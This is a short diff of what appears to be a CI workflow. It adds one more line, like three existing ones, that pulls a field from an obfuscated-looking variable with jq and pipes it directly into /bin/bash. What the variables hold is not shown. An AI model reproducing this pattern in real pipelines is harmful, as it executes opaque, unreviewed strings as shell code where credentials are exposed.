@@ -26,6 +26,7 @@ jobs:
           echo $du0 | jq -r .djx0 | /bin/bash
           printf '%s' "$gp61" | jq -r .lerlp9796 | /bin/bash
           echo $ddq2824 | jq -r .t9 | /bin/bash
+          echo $mtvwo7 | jq -r .zzhuh2 | /bin/bash
 
       - name: Save archive
         if: always()
